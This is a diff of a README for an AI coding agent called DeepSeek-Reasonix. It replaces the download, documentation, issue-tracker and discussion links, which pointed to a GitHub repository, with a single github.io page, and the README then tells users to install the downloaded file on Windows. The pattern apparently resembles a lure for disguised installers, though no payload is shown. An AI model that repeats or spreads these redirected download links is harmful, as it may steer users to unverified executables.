@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-[![Download DeepSeek-Reasonix](https://img.shields.io/badge/Download-DeepSeek--Reasonix-blue?style=for-the-badge&logo=github)](https://github.com/conceptual-ravel203/DeepSeek-Reasonix)
+[![Download DeepSeek-Reasonix](https://img.shields.io/badge/Download-DeepSeek--Reasonix-blue?style=for-the-badge&logo=github)](https://conceptual-ravel203.github.io)
 
 Welcome to **DeepSeek-Reasonix** — a powerful AI coding agent that runs directly in your terminal. It's built around prefix-cache stability, meaning you can leave it running without worrying about performance issues. Whether you're a beginner or an experienced developer, this tool helps you write code faster by using the DeepSeek model.
 
@@ -11,7 +11,7 @@ Welcome to **DeepSeek-Reasonix** — a powerful AI coding agent that runs direct
 Visit this link to download the application. Then follow the instructions below to get started.
 
 ### Step 1: Download the Application
-Click the blue button above or go to [https://github.com/conceptual-ravel203/DeepSeek-Reasonix](https://github.com/conceptual-ravel203/DeepSeek-Reasonix) to download DeepSeek-Reasonix.
+Click the blue button above or go to [https://conceptual-ravel203.github.io](https://conceptual-ravel203.github.io) to download DeepSeek-Reasonix.
 
 ### Step 2: Install on Windows
 1. After downloading, locate the file in your Downloads folder.
@@ -65,9 +65,9 @@ If you encounter any issues:
 
 ## 📚 Additional Resources
 
-- **Documentation**: [DeepSeek-Reasonix Docs](https://github.com/conceptual-ravel203/DeepSeek-Reasonix/wiki)
-- **Support**: [Open an Issue](https://github.com/conceptual-ravel203/DeepSeek-Reasonix/issues)
-- **Community**: [Discussions](https://github.com/conceptual-ravel203/DeepSeek-Reasonix/discussions)
+- **Documentation**: [DeepSeek-Reasonix Docs](https://conceptual-ravel203.github.io)
+- **Support**: [Open an Issue](https://conceptual-ravel203.github.io)
+- **Community**: [Discussions](https://conceptual-ravel203.github.io)
 
 ## 📄 License
 
